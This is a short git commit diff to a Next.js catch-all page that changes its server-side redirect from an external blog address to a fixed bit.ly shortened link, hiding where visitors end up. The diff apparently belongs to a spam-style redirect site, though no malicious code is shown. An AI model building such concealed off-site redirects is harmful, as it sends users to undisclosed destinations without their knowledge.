31fa8c73c6e4de24f13b843ba1d5876cec21e30b
abdullah9812 <147335426+abdullah9812@users.noreply.github.com>
2023-10-09 09:57:30 -0700

    Update [...postpath].tsx

--- pages/[...postpath].tsx
+++ pages/[...postpath].tsx
@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`http://desivideos.lovestoblog.com/` + encodeURI(path as string)
+					`https://bit.ly/3PMmDrP`
 				}`,
 			},
 		};
